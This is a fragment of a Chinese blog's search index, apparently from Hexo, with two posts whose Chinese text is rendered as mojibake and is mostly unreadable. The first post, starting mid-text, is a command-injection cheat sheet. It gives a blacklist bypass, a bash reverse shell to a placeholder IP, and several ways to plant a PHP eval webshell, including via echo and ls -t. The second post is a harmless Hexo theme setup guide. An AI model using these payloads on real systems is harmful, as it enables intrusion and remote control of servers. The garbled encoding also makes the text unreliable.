å¦‚æœå‰é¢æ‰§è¡Œå‡ºé”™ï¼Œæ‰§è¡Œåè¾¹ï¼Œåªèƒ½ä¸ºå‡&amp; å¦‚æœå‰é¢è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåè¾¹ï¼Œå‰è¾¹å¯çœŸå¯å‡&amp;&amp; å‰è¾¹å‡å‡ºé”™ï¼Œå‰è¾¹åªèƒ½ä¸ºçœŸ Linuxæ”¯æŒçš„ç®¡é“ç¬¦; æ‰§è¡Œå®Œå‰è¾¹æ‰§è¡Œåè¾¹| å…ˆæ˜¯åè¾¹è¯­å¥æ‰§è¡Œç»“æœ|| å½“å‰è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œæ‰§è¡Œåè¾¹&amp; å¦‚æœå‰è¾¹ä¸ºå‡ç›´æ¥æ‰§è¡Œåè¾¹ï¼Œå‰é¢å¯çœŸå¯å‡&amp;&amp; å¦‚æœå‰è¾¹ä¸ºå‡å‡ºé”™ï¼Œåªèƒ½ä¸ºçœŸ å‘½ä»¤æ‰§è¡Œçš„å¥‡æ·«æŠ€å·§ ç»•è¿‡é»‘åå•a1;b=s;$a$b æ— å›æ˜¾ç»•è¿‡æ–¹æ³• å¼¹shellï¼Œncç›‘å¬åˆ¤æ–­ nc -l -p 8080 -vvv|bash -i &gt;&amp; /dev/tcp/IP/8080 0&gt;&amp;1 åˆ©ç”¨DNSéš§é“å‚è€ƒæ–‡ç«  åˆ©ç”¨echoå†™é©¬echo '&lt;?php @eval($_GET[1]);?&gt;'&gt;1.php å¦‚æœé•¿åº¦æœ‰é™åˆ¶å¯ä»¥è¿½åŠ ç»•è¿‡echo '&lt;?php'&gt;1.phpecho '@eval('&gt;&gt;1.phpecho '$_GET['&gt;&gt;1.phpecho '1]);'&gt;&gt;1.phpecho '?&gt;'&gt;&gt;1.php æˆ–è€…ç”¨åæ–œæ \æ‹¼æ¥echo "&lt;?php @eval(\\$_POST[1]); ?&gt;"\&gt;&gt; 1.php ä½¿ç”¨å•å¼•å·çš„æ—¶å€™åæ–œæ ä¼šå†™è¿›è¯­å¥çš„é‡Œé¢ï¼Œæ‰€ä»¥ä½¿ç”¨åŒå¼•å·ï¼Œç„¶ååœ¨$çš„å‰é¢åŠ ä¸€ä¸ªåæ–œæ è½¬ä¹‰ åˆ©ç”¨lså†™é©¬é€šè¿‡ls -tæŒ‰æ—¶é—´æ’åˆ—å†™é©¬echo &gt; '?&gt;'echo &gt; '($_POST[1]);'echo &gt; '@eval'echo &gt; '&lt;?php'ls -t &gt; 1.php]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXOé…ç½®æ•™ç¨‹(Next.Mistä¸»é¢˜)]]></title>
    <url>%2F2018%2F07%2F24%2Fhexo-config%2F</url>
    <content type="text"><![CDATA[Hexoç®€ä»‹ hexo ä¸€ä¸ªå¿«é€Ÿç®€æ´é«˜æ•ˆçš„åšå®¢æ¡†æ¶ï¼Œå…¶åŸºäºNode.jsçš„é™æ€blogç¨‹åº ä½œè€…æ˜¯å°æ¹¾çš„tommy351 ä»€ä¹ˆï¼Ÿä½ é—®æˆ‘ä¸ºä»€ä¹ˆä¸ç”¨Wordpressï¼Ÿä½ çŒœã€‚ é‡‡ç”¨ç¬¬ä¸€ç§çš„å¼Šç«¯å°±æ˜¯â€Github Pagesâ€ç¦äº†ç™¾åº¦çˆ¬è™« å‘µï¼æ‰ä¸å­˜åœ¨å‘¢ã€‚æˆ‘ç­‰å°èŒæ–°æ²¡æœ‰å½±å“çš„ã€‚ å¿…è¦å‰æå®‰è£…hexoå‰å¿…é¡»çš„ç¨‹åº Node.js Git Hexoå®˜æ–¹æ–‡æ¡£Nodejså®˜æ–¹æ–‡æ¡£Nextå®˜æ–¹æ–‡æ¡£ å®‰è£…Nodejs#å®‰è£…nodejs$ sudo git clone https://github.com/nodejs/node.gitCloning into 'node'...#ä¿®æ”¹ç›®å½•æƒé™ï¼š$ sudo chmod -R 755 node#ä½¿ç”¨ ./configure åˆ›å»ºç¼–è¯‘æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§ï¼š$ cd node$ sudo ./configure$ sudo make$ sudo make install#æŸ¥çœ‹ node ç‰ˆæœ¬ï¼š$ node --versionv11.1.0 å®‰è£…Gitå¦ä¸€ç‰‡æ–‡ç«  å®‰è£…hexo$ npm install hexo-cli -g åˆ›å»ºç½‘ç«™æ–‡ä»¶$ mkdir blog# åˆå§‹åŒ–$ hexo init blog &amp;&amp; cd blog å®‰è£…hexoæ’ä»¶$ npm install hexo-deployer-git --save$ npm install hexo-asset-image --save# Rss$ npm install hexo-generator-feed --save# sitemap$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save$ npm install hexo-renderer-pug --save$ npm install hexo-renderer-sass --save#æœç´¢æ’ä»¶npm install hexo-generator-searchdb --save# ç”Ÿæˆ SSH å…¬é’¥å’Œå¯†é’¥ é»˜è®¤ç”Ÿæˆåœ¨æ ¹ç›®å½•çš„.sshæ–‡ä»¶å¤¹ä¸‹ ~/.ssh$ ssh-keygen -t rsa # æµ‹è¯• (å‚æ•° -v è¿›å…¥debugæ¨¡å¼)$ ssh -t git@github.com $ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s$ hexo d ç½‘ç«™é…ç½®æ–‡ä»¶ é…ç½®æ–‡ä»¶å­˜å‚¨ä½ç½®:blog/_config.yml# Hexo Configuration Hexoé…ç½®æ–‡ä»¶## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# ç½‘ç«™ä¿¡æ¯# æ ‡é¢˜title: xx# å‰¯æ ‡é¢˜subtitle: xx# åšå®¢æè¿°description: # ä½œè€…æ˜µç§°author: xx# ç½‘ç«™è¯­è¨€ï¼Œé»˜è®¤è‹±è¯­ï¼Œè®¾ç½®ç®€ä½“æ±‰è¯­language: zh-CN# æ—¶åŒºï¼Œé»˜è®¤ç”µè„‘æ—¶åŒºtimezone: Asia/Shanghai# ç½‘å€è®¾ç½®# å¦‚æœç½‘ç«™æ˜¯æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œå°†urlè®¾ç½®æˆ'http://yoursite.com/child'ï¼Œå°†rootè®¾ç½®æˆ'/child/'# ç½‘å€url: https://xx.github.io# ç½‘ç«™æ ¹ç›®å½•ã€‚å¦‚æœç½‘ç«™æ˜¯æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œå°†rootè®¾ç½®æˆ'å­ç›®å½•å'root: /# æ–‡ç« é“¾æ¥åœ°å€æ ¼å¼ ã€‚å³æ–‡ç« å­˜æ”¾çš„ç›®å½•ã€‚permalink: :year/:month/:day/:title/permalink_defaults:# ç›®å½•è®¾ç½®# èµ„æºæ–‡ä»¶å¤¹ï¼Œæ”¾åœ¨é‡Œé¢çš„æ–‡ä»¶ä¼šä¸Šä¼ åˆ°githubä¸­source_dir: source# å…¬å…±æ–‡ä»¶å¤¹ï¼Œå­˜æ”¾ç”Ÿæˆçš„é™æ€æ–‡ä»¶public_dir: public# æ ‡ç­¾æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯tagsã€‚å®é™…å­˜æ”¾åœ¨source/tagsä¸­ã€‚tag_dir: tagsrss_dir: rss# æ¡£æ¡ˆæ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯archivesã€‚archive_dir: archives# åˆ†ç±»æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯categoriesã€‚å®é™…å­˜æ”¾åœ¨source/categoriesä¸­ã€‚category_dir: categories# ä»£ç æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯downloads/codecode_dir: downloads/code# å›½é™…åŒ–æ–‡ä»¶å¤¹ï¼Œé»˜è®¤è·Ÿlanguageç›¸åŒi18n_dir: :lang# ä¸éœ€è¦æ¸²æŸ“çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶å¤¹,æ”¾åœ¨[]ä¸­# è¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯ç™¾åº¦å’Œgoogleçš„ç«™é•¿éªŒè¯æ–‡ä»¶ï¼Œä¸èƒ½æ¸²æŸ“ï¼Œå¦åˆ™ä¼šæ”¹å˜å†…å®¹ï¼Œä¸èƒ½éªŒè¯è¿‡skip_render: [baidu_verify_R9MZjdMkXT.html, google0f8fac7da2b48ef8.html, README.md, æ¨¡æ¿.md]# å†™ä½œé€‰é¡¹# æ–°å»ºåšæ–‡ï¼ˆå¸–å­ï¼‰çš„é»˜è®¤åç§°# File name of new postsnew_post_name: :title.md # é»˜è®¤å¸ƒå±€æ¨¡æ¿æ˜¯postï¼Œè€Œä¸æ˜¯draftå’Œpagedefault_layout: post# æ˜¯å¦å°†æ ‡é¢˜è½¬æ¢æˆæ ‡é¢˜å½¢å¼ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰titlecase: false # Transform title into titlecase# åœ¨æ–°æ ‡ç­¾é¡µé¢ä¸­æ‰“å¼€ç½‘é¡µexternal_link: true # Open external links in new tabfilename_case: 0# æ˜¯å¦æ¸²æŸ“è‰ç¨¿render_drafts: false# å¯åŠ¨ Asset æ–‡ä»¶å¤¹post_asset_folder: false# æŠŠé“¾æ¥æ”¹ä¸ºä¸æ ¹ç›®å½•çš„ç›¸å¯¹ä½å€relative_link: false# æ˜¾ç¤ºæœªæ¥çš„æ–‡ç« future: true# ä»£ç å—çš„è®¾ç½®highlight: enable: true # ä½¿ç”¨ä»£ç é«˜äº® line_number: true # æ˜¾ç¤ºè¡Œå· auto_detect: true # è‡ªåŠ¨æ£€æµ‹è¯­è¨€ tab_replace:# åˆ†ç±»å’Œæ ‡ç­¾# é»˜è®¤åˆ†ç±»default_category: uncategorized# åˆ†ç±»åˆ«åcategory_map:# æ ‡ç­¾åˆ«åtag_map:# æ—¥æœŸå’Œæ—¶é—´æ ¼å¼# Hexo ä½¿ç”¨ Moment.js æ¥è§£æå’Œæ˜¾ç¤ºæ—¶é—´ã€‚## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# åˆ†é¡µé…ç½®# ---------------ä¸‹é¢é€‰é¡¹éœ€è¦å¯¹åº”æ’ä»¶çš„æ”¯æŒ---------------# npm install hexo-generator-index --save# npm install hexo-generator-archive --save# npm install hexo-generator-category --save# npm install hexo-generator-tag --save## Set per_page to 0 to disable pagination# æ¯é¡µæ˜¾ç¤ºçš„æ–‡ç« é‡ # per_page: 20# é¦–é¡µçš„åˆ†é¡µè®¾ç½®index_generator: per_page: 5# å½’æ¡£é¡µçš„åˆ†é¡µè®¾ç½®archive_generator: per_page: 30 yearly: true monthly: true# æ ‡ç­¾é¡µçš„åˆ†é¡µè®¾ç½®tag_generator: per_page: 20# åˆ†é¡µè·¯å¾„ï¼Œåœ¨publicä¸­å¯ä»¥çœ‹åˆ°# pagination_dir: page# Extensions æ‹“å±•æ’ä»¶é…ç½®## Plugins: https://hexo.io/plugins/plugins: baidusitemap: path: baidusitemap.xml# é…ç½®RSSfeed: # feed ç±»å‹ (atom/rss2) type: atom # rss è·¯å¾„ path: atom.xml # åœ¨ rss ä¸­æœ€å¤šç”Ÿæˆçš„æ–‡ç« æ•°(0æ˜¾ç¤ºæ‰€æœ‰) limit: 0# è‡ªå®šä¹‰ç«™ç‚¹å†…å®¹æœç´¢# éœ€è¦å…ˆå®‰è£…æ’ä»¶ï¼š# npm install hexo-generator-search --savesearch: path: search.xml # å¦‚åªæƒ³ç´¢å¼•æ–‡ç« ï¼Œå¯è®¾ç½®ä¸ºpost field: all # ä¸»é¢˜é…ç½®## Themes: https://hexo.io/themes/theme: maupassant# éƒ¨ç½²é…ç½®## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git # éƒ¨ç½²åˆ°github repository: git@github.com:xxx/xxx.github.io.git # åˆ†æ”¯é»˜è®¤master branch: maste ä¸»é¢˜ç¾åŒ–ä¿®æ”¹æ–‡ç« åº•éƒ¨çš„é‚£ä¸ªå¸¦#å·çš„æ ‡ç­¾ä¿®æ”¹æ¨¡æ¿/themes/next/layout/_macro/post.swigæœç´¢ rel=â€tagâ€&gt;#ï¼Œå°† # æ¢æˆ &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; åœ¨æ¯ç¯‡æ–‡ç« æœ«å°¾ç»Ÿä¸€æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°åœ¨è·¯å¾„ \themes\next\layout_macro ä¸­æ–°å»º passage-end-tag.swig æ–‡ä»¶,å¹¶æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;-------------æœ¬æ–‡ç»“æŸ,æ„Ÿè°¢æ‚¨çš„é˜…è¯»-------------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; æ¥ç€æ‰“å¼€\themes\next\layout_macro\post.swigæ–‡ä»¶åœ¨post-body ä¹‹åï¼Œ post-footerä¹‹å‰æ·»åŠ &lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; ç„¶ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶ä¸­æœ€ååŠ å…¥# æ–‡ç« æœ«å°¾æ·»åŠ â€œæœ¬æ–‡ç»“æŸâ€æ ‡è®°passage_end_tag: enabled: true ä¿®æ”¹ä½œè€…å¤´åƒå¹¶æ—‹è½¬æ‰“å¼€\themes\next\source\css_common\components\sidebar\sidebar-author.stylåœ¨é‡Œé¢æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š.site-author-image &#123; display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* å¤´åƒåœ†å½¢ */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* è®¾ç½®å¾ªç¯åŠ¨ç”» [animation: (play)åŠ¨ç”»åç§° (2s)åŠ¨ç”»æ’­æ”¾æ—¶é•¿å•ä½ç§’æˆ–å¾®ç§’ (ase-out)åŠ¨ç”»æ’­æ”¾çš„é€Ÿåº¦æ›²çº¿ä¸ºä»¥ä½é€Ÿç»“æŸ (1s)ç­‰å¾…1ç§’ç„¶åå¼€å§‹åŠ¨ç”» (1)åŠ¨ç”»æ’­æ”¾æ¬¡æ•°(infiniteä¸ºå¾ªç¯æ’­æ”¾) ]*/ /* é¼ æ ‡ç»è¿‡å¤´åƒæ—‹è½¬360åº¦ */ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out;&#125;img:hover &#123; /* é¼ æ ‡ç»è¿‡åœæ­¢å¤´åƒæ—‹è½¬ -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* é¼ æ ‡ç»è¿‡å¤´åƒæ—‹è½¬360åº¦ */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);&#125;/* Z è½´æ—‹è½¬åŠ¨ç”» */@-webkit-keyframes play &#123; 0% &#123; -webkit-transform: rotateZ(0deg); &#125; 100% &#123; -webkit-transform: rotateZ(-360deg); &#125;&#125;@-moz-keyframes play &#123; 0% &#123; -moz-transform: rotateZ(0deg); &#125; 100% &#123; -moz-transform: rotateZ(-360deg); &#125;&#125;@keyframes play &#123; 0% &#123; transform: rotateZ(0deg); &#125; 100% &#123; transform: rotateZ(-360deg); &#125;&#125; ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœæ‰“å¼€\themes\next\source\css_custom\custom.styl,å‘é‡Œé¢åŠ å…¥ï¼š // ä¸»é¡µæ–‡ç« æ·»åŠ é˜´å½±æ•ˆæœ .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; ç¾åŒ–å‚è€ƒæ–‡ç« ]]></content>
      <categories>
        <category>æ‚ä¸ƒæ‚å…«</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
